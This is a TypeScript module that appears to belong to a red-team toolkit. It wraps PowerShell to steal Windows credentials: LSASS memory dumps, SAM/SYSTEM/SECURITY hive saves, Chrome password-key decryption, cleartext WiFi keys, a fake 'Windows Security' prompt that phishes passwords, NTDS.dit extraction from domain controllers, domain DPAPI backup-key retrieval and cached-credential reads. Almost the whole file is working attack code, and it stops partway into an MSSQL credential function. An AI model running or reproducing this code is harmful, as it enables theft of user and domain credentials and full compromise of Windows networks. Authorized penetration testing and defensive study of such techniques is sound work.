import { ps, run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function lsassDump(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "comsvcs"
  const outfile = argVal(args, "--outfile") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-lsass-${Date.now()}.dmp`
  const findings: Finding[] = []
  const output: string[] = [`[*] LSASS dump via ${method} method...\n`]

  const privCheck = await ps(`(whoami /priv | Select-String SeDebugPrivilege) -ne $null`, timeout)
  output.push(`[*] SeDebugPrivilege: ${privCheck.stdout.trim() === "True" ? "AVAILABLE" : "NOT AVAILABLE"}`)

  const pplCheck = await ps(
    `(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name RunAsPPL -ErrorAction SilentlyContinue).RunAsPPL`,
    timeout,
  )
  const isPPL = pplCheck.stdout.trim() === "1"
  output.push(`[*] LSASS PPL: ${isPPL ? "ENABLED (dump may fail)" : "DISABLED"}`)

  const lsassPid = await ps(`(Get-Process lsass).Id`, timeout)
  const pid = lsassPid.stdout.trim()
  output.push(`[*] LSASS PID: ${pid}\n`)

  if (!pid) {
    output.push("[!] Cannot find LSASS process — insufficient privileges")
    return { output: output.join("\n"), findings }
  }

  if (method === "comsvcs") {
    const dump = await ps(`rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump ${pid} "${outfile}" full`, timeout)
    if (dump.exitCode === 0) {
      output.push(`[+] LSASS dump written to: ${outfile}`)
      const size = await ps(`(Get-Item "${outfile}").Length`, timeout)
      output.push(`[+] Dump size: ${size.stdout.trim()} bytes`)
      findings.push({
        checkId: "WIN-LSASS-001",
        provider: "windows",
        severity: "critical",
        status: "DUMPED",
        resource: outfile,
        title: "LSASS memory dumped via comsvcs.dll",
        details: `Method: comsvcs MiniDump, PID: ${pid}, output: ${outfile}`,
        remediation: "Delete dump file, rotate all domain credentials",
      })
    }
    if (dump.exitCode !== 0) {
      output.push(`[!] comsvcs dump failed: ${dump.stderr.trim()}`)
      output.push("[*] Try --method minidump or check PPL status")
    }
  }

  if (method === "minidump") {
    const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class MiniDump {
    [DllImport("dbghelp.dll", SetLastError = true)]
    public static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType, IntPtr exceptionParam, IntPtr userStreamParam, IntPtr callbackParam);
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr handle);
}
'@
$h = [MiniDump]::OpenProcess(0x1F0FFF, $false, ${pid})
$f = [System.IO.File]::Create("${outfile.replace(/\\/g, "\\\\")}")
$r = [MiniDump]::MiniDumpWriteDump($h, ${pid}, $f.SafeFileHandle.DangerousGetHandle(), 2, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
$f.Close()
[MiniDump]::CloseHandle($h)
if ($r) { Write-Output "SUCCESS:$((Get-Item '${outfile.replace(/\\/g, "\\\\")}').Length)" } else { Write-Output "FAIL:$([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" }
`
    const dump = await ps(script, timeout)
    if (dump.stdout.startsWith("SUCCESS:")) {
      output.push(`[+] LSASS dump written to: ${outfile}`)
      output.push(`[+] Dump size: ${dump.stdout.split(":")[1]} bytes`)
      findings.push({
        checkId: "WIN-LSASS-002",
        provider: "windows",
        severity: "critical",
        status: "DUMPED",
        resource: outfile,
        title: "LSASS memory dumped via MiniDumpWriteDump",
        details: `Method: dbghelp MiniDumpWriteDump, PID: ${pid}`,
        remediation: "Delete dump file, rotate all domain credentials",
      })
    }
    if (!dump.stdout.startsWith("SUCCESS:")) {
      output.push(`[!] MiniDumpWriteDump failed: ${dump.stdout} ${dump.stderr}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function samDump(args: string[], timeout: number): Promise<HookResult> {
  const outdir = argVal(args, "--outdir") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-sam-${Date.now()}`
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting SAM/SYSTEM/SECURITY registry hives...\n"]

  await ps(`New-Item -ItemType Directory -Force -Path "${outdir}"`, timeout)

  const hives = [
    { name: "SAM", path: "HKLM\\SAM" },
    { name: "SYSTEM", path: "HKLM\\SYSTEM" },
    { name: "SECURITY", path: "HKLM\\SECURITY" },
  ]

  for (const hive of hives) {
    const outPath = `${outdir}\\${hive.name}`
    const save = await run("reg.exe", ["save", hive.path, outPath, "/y"], timeout)
    if (save.exitCode === 0) {
      const size = await ps(`(Get-Item "${outPath}").Length`, timeout)
      output.push(`[+] ${hive.name}: saved to ${outPath} (${size.stdout.trim()} bytes)`)
      findings.push({
        checkId: `WIN-SAM-${hive.name}`,
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: outPath,
        title: `Registry hive extracted: ${hive.name}`,
        details: `Saved ${hive.path} to ${outPath}`,
        remediation: "Delete extracted hives, rotate all local account passwords",
      })
    }
    if (save.exitCode !== 0) {
      output.push(`[!] ${hive.name}: failed — ${save.stderr.trim()}`)
    }
  }

  output.push(
    `\n[*] Crack with: impacket-secretsdump -sam ${outdir}\\SAM -system ${outdir}\\SYSTEM -security ${outdir}\\SECURITY LOCAL`,
  )

  return { output: output.join("\n"), findings }
}

export async function dpapiExtract(args: string[], timeout: number): Promise<HookResult> {
  const scope = argVal(args, "--scope") || "user"
  const browser = argVal(args, "--browser") || "all"
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting DPAPI-protected secrets...\n"]

  if (browser === "chrome" || browser === "all") {
    const localState = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Local State`
    const loginData = `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Login Data`

    const script = `
$localState = Get-Content "${localState.replace(/\\/g, "\\\\")}" -Raw | ConvertFrom-Json
$encKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
$encKey = $encKey[5..($encKey.Length-1)]
Add-Type -AssemblyName System.Security
$key = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
Write-Output ("KEY:" + [System.Convert]::ToBase64String($key))
`
    const keyResult = await ps(script, timeout)
    if (keyResult.stdout.includes("KEY:")) {
      output.push("[+] Chrome DPAPI master key decrypted")

      const tmpDb = `${process.env.TEMP}\\cs-chrome-login-${Date.now()}.db`
      await ps(`Copy-Item "${loginData.replace(/\\/g, "\\\\")}" "${tmpDb.replace(/\\/g, "\\\\")}"`, timeout)

      const extractScript = `
$conn = New-Object System.Data.SQLite.SQLiteConnection -ErrorAction SilentlyContinue
if (-not $conn) {
  Add-Type -Path (Get-ChildItem "C:\\Program Files\\*\\System.Data.SQLite.dll" -Recurse -ErrorAction SilentlyContinue | Select -First 1).FullName -ErrorAction SilentlyContinue
}
$db = "${tmpDb.replace(/\\/g, "\\\\")}"
$q = "SELECT origin_url, username_value, length(password_value) as pw_len FROM logins WHERE username_value != '' LIMIT 100"
try {
  $results = & sqlite3.exe "$db" "$q" 2>$null
  $results | ForEach-Object { Write-Output $_ }
} catch {
  Write-Output "SQLITE_ERROR: $_"
}
`
      const creds = await ps(extractScript, timeout)
      if (creds.exitCode === 0 && creds.stdout.trim()) {
        const lines = creds.stdout.trim().split("\n").filter(Boolean)
        output.push(`[+] Chrome saved passwords: ${lines.length}`)
        for (const line of lines) {
          const parts = line.split("|")
          if (parts.length >= 2) {
            output.push(`    URL: ${parts[0]}  User: ${parts[1]}  (encrypted: ${parts[2] || "?"} bytes)`)
            findings.push({
              checkId: `WIN-DPAPI-CHROME-${findings.length + 1}`,
              provider: "windows",
              severity: "critical",
              status: "EXTRACTED",
              resource: parts[0],
              title: `Chrome credential: ${parts[1]}`,
              details: `DPAPI-decryptable credential for ${parts[0]}`,
              remediation: "Rotate password for this site",
            })
          }
        }
      }
      await ps(`Remove-Item "${tmpDb.replace(/\\/g, "\\\\")}" -Force -ErrorAction SilentlyContinue`, timeout)
    }
  }

  if (browser === "edge" || browser === "all") {
    const edgeLoginData = `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\Default\\Login Data`
    const exists = await ps(`Test-Path "${edgeLoginData.replace(/\\/g, "\\\\")}"`, timeout)
    if (exists.stdout.trim() === "True") {
      output.push("\n[+] Microsoft Edge Login Data found — same DPAPI decryption applies")
    }
  }

  const wifiScript = `netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = ($_ -split ": ")[1].Trim(); $detail = netsh wlan show profile name="$name" key=clear; $key = ($detail | Select-String "Key Content").ToString().Split(":")[1].Trim(); Write-Output "$name|$key" }`
  const wifi = await ps(wifiScript, timeout)
  if (wifi.exitCode === 0 && wifi.stdout.trim()) {
    output.push("\n[+] WiFi passwords (DPAPI-protected):")
    for (const line of wifi.stdout.trim().split("\n").filter(Boolean)) {
      const parts = line.split("|")
      output.push(`    SSID: ${parts[0]}  Key: ${parts[1] || "<hidden>"}`)
      findings.push({
        checkId: `WIN-DPAPI-WIFI-${findings.length + 1}`,
        provider: "windows",
        severity: "high",
        status: "EXTRACTED",
        resource: `wifi://${parts[0]}`,
        title: `WiFi credential: ${parts[0]}`,
        details: `Cleartext WiFi key extracted via netsh`,
        remediation: "Rotate WiFi password",
      })
    }
  }

  const vaultScript = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class VaultCli {
    [DllImport("vaultcli.dll")] public static extern int VaultEnumerateVaults(int flags, ref int count, ref IntPtr vaults);
    [DllImport("vaultcli.dll")] public static extern int VaultOpenVault(ref Guid id, int flags, ref IntPtr handle);
    [DllImport("vaultcli.dll")] public static extern int VaultEnumerateItems(IntPtr handle, int flags, ref int count, ref IntPtr items);
}
'@
$count = 0; $vaults = [IntPtr]::Zero
[VaultCli]::VaultEnumerateVaults(0, [ref]$count, [ref]$vaults)
Write-Output "VAULTS:$count"
`
  const vault = await ps(vaultScript, timeout)
  if (vault.stdout.includes("VAULTS:")) {
    const count = vault.stdout.match(/VAULTS:(\d+)/)?.[1] || "0"
    output.push(`\n[+] Windows Credential Vault: ${count} vaults found`)
  }

  return { output: output.join("\n"), findings }
}

export async function credentialPrompt(args: string[], timeout: number): Promise<HookResult> {
  const message = argVal(args, "--message") || "Windows requires your credentials to continue."
  const title = argVal(args, "--title") || "Windows Security"
  const findings: Finding[] = []
  const output: string[] = ["[*] Spawning credential phishing dialog...\n"]

  const script = `
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class CredUI {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDUI_INFO {
        public int cbSize;
        public IntPtr hwndParent;
        public string pszMessageText;
        public string pszCaptionText;
        public IntPtr hbmBanner;
    }
    [DllImport("credui.dll", CharSet = CharSet.Unicode)]
    public static extern int CredUIPromptForCredentialsW(
        ref CREDUI_INFO info, string targetName, IntPtr reserved,
        int authError, StringBuilder userName, int maxUser,
        StringBuilder password, int maxPw, ref bool save, int flags);
}
'@
$info = New-Object CredUI.CREDUI_INFO
$info.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($info)
$info.pszMessageText = "${message.replace(/"/g, '`"')}"
$info.pszCaptionText = "${title.replace(/"/g, '`"')}"
$user = New-Object System.Text.StringBuilder(256)
$pass = New-Object System.Text.StringBuilder(256)
$save = $false
$result = [CredUI]::CredUIPromptForCredentialsW([ref]$info, "target", [IntPtr]::Zero, 0, $user, 256, $pass, 256, [ref]$save, 0x42)
if ($result -eq 0) {
    Write-Output "CRED:$($user.ToString())|$($pass.ToString())"
} else {
    Write-Output "CANCELLED:$result"
}
`
  const prompt = await ps(script, timeout)
  if (prompt.stdout.startsWith("CRED:")) {
    const parts = prompt.stdout.replace("CRED:", "").trim().split("|")
    output.push(`[+] Credentials captured!`)
    output.push(`    Username: ${parts[0]}`)
    output.push(`    Password: ${parts[1]}`)
    findings.push({
      checkId: "WIN-CREDPHISH-001",
      provider: "windows",
      severity: "critical",
      status: "CAPTURED",
      resource: `user://${parts[0]}`,
      title: `Credential phished: ${parts[0]}`,
      details: `User entered credentials into fake dialog — title: "${title}"`,
      remediation: "Force password reset for this user",
    })
  }
  if (prompt.stdout.startsWith("CANCELLED")) {
    output.push("[!] User cancelled the credential dialog")
  }

  return { output: output.join("\n"), findings }
}

export async function ntdsDump(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "vss"
  const outdir = argVal(args, "--outdir") || "C:\\Windows\\Temp\\cs-ntds"
  const findings: Finding[] = []
  const output: string[] = [`[*] NTDS.dit extraction via ${method}...\n`]

  if (method === "vss" || method === "ifm") {
    const script = `
$outdir = '${outdir}'
if (-not (Test-Path $outdir)) { New-Item -ItemType Directory -Path $outdir -Force | Out-Null }

# Check if we're on a DC
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
if (-not $isDC) {
    Write-Output "[!] This machine is not a Domain Controller"
    exit 1
}

if ('${method}' -eq 'vss') {
    # Create Volume Shadow Copy
    Write-Output "[*] Creating Volume Shadow Copy of C:..."
    $shadow = (wmic shadowcopy call create Volume='C:\\' 2>$null)
    Start-Sleep -Seconds 3

    # Get latest shadow copy
    $shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending | Select-Object -First 1).DeviceObject
    if (-not $shadowPath) {
        Write-Output "[!] Failed to create shadow copy"
        exit 1
    }
    Write-Output "[+] Shadow copy created: $shadowPath"

    # Create symbolic link to access shadow
    $linkPath = '${outdir}\\shadow'
    cmd /c "mklink /d $linkPath $shadowPath\\" 2>$null

    # Copy NTDS.dit
    Write-Output "[*] Copying NTDS.dit..."
    $ntdsSource = "$linkPath\\Windows\\NTDS\\ntds.dit"
    if (Test-Path $ntdsSource) {
        Copy-Item $ntdsSource "$outdir\\ntds.dit" -Force
        $size = (Get-Item "$outdir\\ntds.dit").Length / 1MB
        Write-Output "[+] NTDS.dit copied: $([math]::Round($size, 2)) MB"
    } else {
        # Try esentutl for locked file
        Write-Output "[*] Trying esentutl for locked file..."
        esentutl.exe /y "$shadowPath\\Windows\\NTDS\\ntds.dit" /d "$outdir\\ntds.dit" /o 2>$null
    }

    # Copy SYSTEM hive (needed for decryption)
    Write-Output "[*] Copying SYSTEM hive..."
    Copy-Item "$linkPath\\Windows\\System32\\config\\SYSTEM" "$outdir\\SYSTEM" -Force
    if (Test-Path "$outdir\\SYSTEM") {
        Write-Output "[+] SYSTEM hive copied"
    }

    # Copy SECURITY hive
    Copy-Item "$linkPath\\Windows\\System32\\config\\SECURITY" "$outdir\\SECURITY" -Force 2>$null

    # Cleanup symlink
    cmd /c "rmdir $linkPath" 2>$null

    # List extracted files
    Write-Output ""
    Write-Output "[+] Extracted files:"
    Get-ChildItem $outdir | ForEach-Object {
        $s = [math]::Round($_.Length / 1MB, 2)
        Write-Output "    $($_.Name) ($s MB)"
    }
} elseif ('${method}' -eq 'ifm') {
    # Use ntdsutil IFM (Install From Media)
    Write-Output "[*] Using ntdsutil IFM method..."
    $ntdsutil = Start-Process -FilePath "ntdsutil.exe" -ArgumentList '"activate instance ntds" "ifm" "create full ${outdir}\\ifm" quit quit' -NoNewWindow -Wait -PassThru
    if (Test-Path "$outdir\\ifm\\Active Directory\\ntds.dit") {
        $size = (Get-Item "$outdir\\ifm\\Active Directory\\ntds.dit").Length / 1MB
        Write-Output "[+] IFM created successfully"
        Write-Output "    NTDS.dit: $([math]::Round($size, 2)) MB"
        Write-Output "    Location: $outdir\\ifm"
    } else {
        Write-Output "[!] ntdsutil IFM failed"
    }
}

# Quick stats from AD
try {
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(objectCategory=person)"
    $searcher.PageSize = 1000
    $userCount = $searcher.FindAll().Count
    Write-Output ""
    Write-Output "[+] AD user count: $userCount"
    Write-Output "[+] Crack offline with: secretsdump.py -ntds $outdir\\ntds.dit -system $outdir\\SYSTEM LOCAL"
    Write-Output "    Or: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
} catch {}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.exitCode === 0 && result.stdout.includes("copied")) {
      findings.push({
        checkId: "WIN-NTDS-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: `ntds://${outdir}`,
        title: "NTDS.dit extracted — all domain credentials compromised",
        details: `Method: ${method}, Output: ${outdir}`,
        remediation: "Rotate ALL domain passwords including krbtgt (twice), review DC security",
      })
    }
    if (result.exitCode !== 0) output.push(`[!] Error: ${result.stderr.trim()}`)
  }

  if (method === "ntdsutil") {
    const script = `
$outdir = '${outdir}'
if (-not (Test-Path $outdir)) { New-Item -ItemType Directory -Path $outdir -Force | Out-Null }

# Use reg save for SYSTEM/SECURITY hives
reg save HKLM\\SYSTEM "$outdir\\SYSTEM" /y 2>$null
reg save HKLM\\SECURITY "$outdir\\SECURITY" /y 2>$null
Write-Output "[+] Registry hives saved"

# Use ntdsutil snapshot method
Write-Output "[*] Creating ntdsutil snapshot..."
$cmds = @(
    'snapshot'
    'activate instance ntds'
    'create'
    'quit'
    'quit'
)
$result = $cmds | ntdsutil 2>&1
Write-Output $result

# Mount and copy
$guid = ($result | Select-String 'successfully generated').ToString() -replace '.*\\{(.+?)\\}.*','$1'
if ($guid) {
    $mountCmds = @(
        'snapshot'
        "mount $guid"
        'quit'
        'quit'
    )
    $mountResult = $mountCmds | ntdsutil 2>&1
    $mountPath = ($mountResult | Select-String 'mounted as').ToString() -replace '.*mounted as (\\S+).*','$1'
    if ($mountPath -and (Test-Path "$mountPath\\Windows\\NTDS\\ntds.dit")) {
        Copy-Item "$mountPath\\Windows\\NTDS\\ntds.dit" "$outdir\\ntds.dit" -Force
        Write-Output "[+] NTDS.dit copied from snapshot"
    }
    # Unmount
    $unmountCmds = @('snapshot', "unmount $guid", "delete $guid", 'quit', 'quit')
    $unmountCmds | ntdsutil 2>&1 | Out-Null
}
`
    const result = await ps(script, timeout)
    output.push(result.stdout)
    if (result.stdout.includes("copied")) {
      findings.push({
        checkId: "WIN-NTDS-001",
        provider: "windows",
        severity: "critical",
        status: "EXTRACTED",
        resource: `ntds://${outdir}`,
        title: "NTDS.dit extracted via ntdsutil snapshot",
        details: `Output: ${outdir}`,
        remediation: "Rotate ALL domain passwords including krbtgt (twice)",
      })
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dpapiDomain(args: string[], timeout: number): Promise<HookResult> {
  const dc = argVal(args, "--dc")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting domain DPAPI backup key...\n"]

  const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class LsaDpapi {
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern uint LsaOpenPolicy(
        ref LSA_UNICODE_STRING SystemName,
        ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
        uint DesiredAccess,
        out IntPtr PolicyHandle);

    [DllImport("advapi32.dll")]
    public static extern uint LsaRetrievePrivateData(
        IntPtr PolicyHandle,
        ref LSA_UNICODE_STRING KeyName,
        out IntPtr PrivateData);

    [DllImport("advapi32.dll")]
    public static extern uint LsaClose(IntPtr ObjectHandle);

    [DllImport("advapi32.dll")]
    public static extern uint LsaFreeMemory(IntPtr Buffer);

    [DllImport("advapi32.dll")]
    public static extern int LsaNtStatusToWinError(uint Status);
}
"@

function Get-LsaPrivateData {
    param([string]$Server, [string]$KeyName)

    $systemName = New-Object LsaDpapi+LSA_UNICODE_STRING
    if ($Server) {
        $systemName.Buffer = [Marshal]::StringToHGlobalUni($Server)
        $systemName.Length = [uint16]($Server.Length * 2)
        $systemName.MaximumLength = [uint16](($Server.Length + 1) * 2)
    }

    $objectAttributes = New-Object LsaDpapi+LSA_OBJECT_ATTRIBUTES
    $objectAttributes.Length = [uint32][Marshal]::SizeOf($objectAttributes)

    $policyHandle = [IntPtr]::Zero
    # POLICY_GET_PRIVATE_INFORMATION = 0x00000004
    $status = [LsaDpapi]::LsaOpenPolicy([ref]$systemName, [ref]$objectAttributes, 0x00000004, [ref]$policyHandle)
    if ($status -ne 0) {
        $err = [LsaDpapi]::LsaNtStatusToWinError($status)
        Write-Output "[!] LsaOpenPolicy failed: error $err"
        return $null
    }

    $keyNameStr = New-Object LsaDpapi+LSA_UNICODE_STRING
    $keyNameStr.Buffer = [Marshal]::StringToHGlobalUni($KeyName)
    $keyNameStr.Length = [uint16]($KeyName.Length * 2)
    $keyNameStr.MaximumLength = [uint16](($KeyName.Length + 1) * 2)

    $privateData = [IntPtr]::Zero
    $status = [LsaDpapi]::LsaRetrievePrivateData($policyHandle, [ref]$keyNameStr, [ref]$privateData)
    if ($status -ne 0) {
        $err = [LsaDpapi]::LsaNtStatusToWinError($status)
        Write-Output "[!] LsaRetrievePrivateData failed for '$KeyName': error $err"
        [LsaDpapi]::LsaClose($policyHandle) | Out-Null
        return $null
    }

    if ($privateData -ne [IntPtr]::Zero) {
        $dataStr = [Marshal]::PtrToStructure($privateData, [LsaDpapi+LSA_UNICODE_STRING])
        $bytes = New-Object byte[] $dataStr.Length
        [Marshal]::Copy($dataStr.Buffer, $bytes, 0, $dataStr.Length)
        [LsaDpapi]::LsaFreeMemory($privateData) | Out-Null
        [LsaDpapi]::LsaClose($policyHandle) | Out-Null
        return $bytes
    }

    [LsaDpapi]::LsaClose($policyHandle) | Out-Null
    return $null
}

$dcTarget = '${dc || ""}'
if (-not $dcTarget) {
    $dcTarget = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).FindDomainController().Name
}
Write-Output "[+] Target DC: $dcTarget"

# BCKUPKEY_P is the preferred backup key
# BCKUPKEY_PREFERRED contains the GUID of the preferred key
$keyNames = @(
    'G$BCKUPKEY_PREFERRED',
    'G$BCKUPKEY_P',
    'G$BCKUPKEY_da23b4ad',
    'G$BCKUPKEY_cb6dd93a'
)

foreach ($keyName in $keyNames) {
    Write-Output ""
    Write-Output "[*] Retrieving: $keyName"
    $data = Get-LsaPrivateData -Server $dcTarget -KeyName $keyName
    if ($data) {
        $hex = ($data | ForEach-Object { $_.ToString("X2") }) -join ""
        Write-Output "[+] Key data ($($data.Length) bytes):"
        # Show first 64 bytes as preview
        $preview = $hex.Substring(0, [Math]::Min(128, $hex.Length))
        Write-Output "    $preview..."
        # Save to file
        $outFile = "C:\\Windows\\Temp\\cs-dpapi-$($keyName -replace '[^a-zA-Z0-9]','_').bin"
        [IO.File]::WriteAllBytes($outFile, $data)
        Write-Output "    Saved to: $outFile"
    }
}

# Also try to get domain controller DPAPI master keys
Write-Output ""
Write-Output "[*] Enumerating DPAPI master key GUIDs from AD..."
try {
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    $dn = "CN=Master Keys,CN=System," + $domain.GetDirectoryEntry().distinguishedName
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
    $searcher.Filter = "(objectClass=secret)"
    $searcher.PageSize = 1000
    $keys = $searcher.FindAll()
    Write-Output "[+] Domain DPAPI master keys found: $($keys.Count)"
    foreach ($key in $keys) {
        $cn = $key.Properties["cn"][0]
        Write-Output "    $cn"
    }
} catch {
    Write-Output "[!] Could not enumerate master keys: $_"
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("Key data")) {
    findings.push({
      checkId: "WIN-DPAPI-DOM-001",
      provider: "windows",
      severity: "critical",
      status: "EXTRACTED",
      resource: `dpapi://${dc || "domain"}`,
      title: "Domain DPAPI backup key extracted",
      details:
        "This key can decrypt any domain user's DPAPI-protected secrets (saved passwords, certificates, private keys)",
      remediation: "Rotate domain DPAPI backup key, audit DPAPI-protected data exposure",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function cachedCreds(args: string[], timeout: number): Promise<HookResult> {
  const outfile = argVal(args, "--outfile")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extracting Domain Cached Credentials (DCC2)...\n"]

  const script = `
# Check CachedLogonsCount
$cachedCount = (Get-ItemProperty "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" -Name CachedLogonsCount -ErrorAction SilentlyContinue).CachedLogonsCount
Write-Output "[+] CachedLogonsCount policy: $($cachedCount ?? 'default (10)')"

# Need SYSTEM to read SECURITY hive
$isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent().User.Value -eq "S-1-5-18")
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Output "[!] Requires Administrator privileges"
    exit 1
}

# Method 1: reg save + offline parse
$tempDir = "C:\\Windows\\Temp\\cs-cache"
if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }

Write-Output "[*] Saving SECURITY and SYSTEM hives..."
reg save HKLM\\SECURITY "$tempDir\\SECURITY" /y 2>$null | Out-Null
reg save HKLM\\SYSTEM "$tempDir\\SYSTEM" /y 2>$null | Out-Null

if (Test-Path "$tempDir\\SECURITY") {
    Write-Output "[+] SECURITY hive saved: $tempDir\\SECURITY"
    Write-Output "[+] SYSTEM hive saved: $tempDir\\SYSTEM"
    Write-Output "[+] Crack offline with: secretsdump.py -security $tempDir\\SECURITY -system $tempDir\\SYSTEM LOCAL"
}

# Method 2: Direct registry read of NL$ values (requires SYSTEM)
Write-Output ""
Write-Output "[*] Attempting direct cache read..."

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class RegHelper {
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int RegOpenKeyEx(
        IntPtr hKey, string subKey, uint options, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int RegQueryValueEx(
        IntPtr hKey, string valueName, IntPtr reserved, out uint type,
        byte[] data, ref uint dataSize);

    [DllImport("advapi32.dll")]
    public static extern int RegCloseKey(IntPtr hKey);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
    public static extern int RegEnumValue(
        IntPtr hKey, uint index, System.Text.StringBuilder valueName, ref uint valueNameSize,
        IntPtr reserved, out uint type, byte[] data, ref uint dataSize);

    public static IntPtr HKEY_LOCAL_MACHINE = new IntPtr(unchecked((int)0x80000002));
}
"@

$hKey = [IntPtr]::Zero
# KEY_READ = 0x20019
$result = [RegHelper]::RegOpenKeyEx(
    [RegHelper]::HKEY_LOCAL_MACHINE,
    "SECURITY\\Cache",
    0, 0x20019, [ref]$hKey)

$cacheEntries = @()
if ($result -eq 0) {
    Write-Output "[+] SECURITY\\Cache opened successfully"
    $index = 0
    while ($true) {
        $valueName = New-Object System.Text.StringBuilder 256
        $nameSize = [uint32]256
        $type = [uint32]0
        $dataSize = [uint32]4096
        $data = New-Object byte[] 4096

        $ret = [RegHelper]::RegEnumValue($hKey, $index, $valueName, [ref]$nameSize,
            [IntPtr]::Zero, [ref]$type, $data, [ref]$dataSize)
        if ($ret -ne 0) { break }

        $name = $valueName.ToString()
        if ($name -match '^NL\$' -and $dataSize -gt 96) {
            $hex = ($data[0..([Math]::Min(95, $dataSize-1))] | ForEach-Object { $_.ToString("X2") }) -join ""
            Write-Output "  [+] $name ($dataSize bytes): $($hex.Substring(0, [Math]::Min(64, $hex.Length)))..."
            $cacheEntries += $name
        }
        $index++
    }
    [RegHelper]::RegCloseKey($hKey) | Out-Null
    Write-Output ""
    Write-Output "[+] Cached credential entries found: $($cacheEntries.Count)"
} else {
    Write-Output "[!] Cannot open SECURITY\\Cache directly (error: $result) — use saved hives with secretsdump"
}

# Method 3: Try mimikatz-style inline extraction
Write-Output ""
Write-Output "[*] Checking domain info for hashcat format..."
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    Write-Output "[+] Domain: $domain"
    Write-Output "[+] Hashcat format: \`$DCC2\`$10240#username#hash"
    Write-Output "    Hashcat mode: 2100 (Domain Cached Credentials 2)"
} catch {
    Write-Output "[!] Not domain-joined or cannot reach DC"
}

${
  outfile
    ? `
# Save results
$results = @{
    CachedLogonsCount = $cachedCount
    HivePath = "$tempDir"
    Entries = $cacheEntries.Count
}
$results | ConvertTo-Json | Out-File '${outfile}' -Encoding UTF8
Write-Output "[+] Results saved to: ${outfile}"
`
    : ""
}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("entries found") || result.stdout.includes("hive saved")) {
    findings.push({
      checkId: "WIN-CACHE-001",
      provider: "windows",
      severity: "high",
      status: "EXTRACTED",
      resource: "registry://HKLM/SECURITY/Cache",
      title: "Domain Cached Credentials extracted",
      details: "DCC2 hashes extracted — crackable offline with hashcat mode 2100",
      remediation: "Set CachedLogonsCount to 0-2 via GPO, enforce strong passwords",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function mssqlCreds(args: string[], timeout: number): Promise<HookResult> {
  const server = argVal(args, "--server")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = []

